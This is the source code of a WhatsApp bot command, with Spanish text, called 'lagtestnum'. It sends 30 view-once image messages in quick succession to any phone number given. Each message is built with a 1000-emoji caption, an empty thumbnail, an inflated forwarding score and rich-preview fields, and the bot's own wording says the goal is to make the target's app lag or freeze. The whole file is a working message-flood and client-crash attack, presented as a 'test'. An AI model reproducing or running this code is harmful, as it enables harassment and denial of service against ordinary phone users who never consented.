let handler = async (m, { conn, args, usedPrefix, command }) => {
  let number = args[0];

  if (!number || !number.match(/^\d{5,}$/)) {
    return m.reply(`✳️ *Formato incorrecto*\n\n📌 Usa: *${usedPrefix + command} 573001234567*`);
  }

  let jid = number + "@s.whatsapp.net";
  let times = 30; // Número de envíos

  m.reply(`📡 *Enviando Lag Test a* ${jid}...`);

  for (let i = 0; i < times; i++) {
    await conn.relayMessage(jid, {
      viewOnceMessage: {
        message: {
          imageMessage: {
            mimetype: "image/jpeg",
            caption: '🧨'.repeat(1000),
            jpegThumbnail: Buffer.alloc(0),
            contextInfo: {
              forwardingScore: 999,
              isForwarded: true,
              mentionedJid: ["0@s.whatsapp.net"],
              externalAdReply: {
                title: "🚧 WhatsApp Lag Test 🚧",
                body: "Cargando contenido...",
                thumbnailUrl: "https://telegra.ph/file/94cf0cb2054ff45e3f0df.jpg",
                sourceUrl: "https://whatsapp.com",
                mediaType: 1,
                renderLargerThumbnail: true
              }
            }
          }
        }
      }
    }, { messageId: null });

    await new Promise(res => setTimeout(res, 200)); // delay entre cada mensaje
  }

  m.reply("✅ *Lag Test finalizado.* Revisa si el número tuvo delay o freeze.");
};

handler.command = /^lagtestnum$/i;
handler.owner = true; // solo el dueño puede usarlo
export default handler;
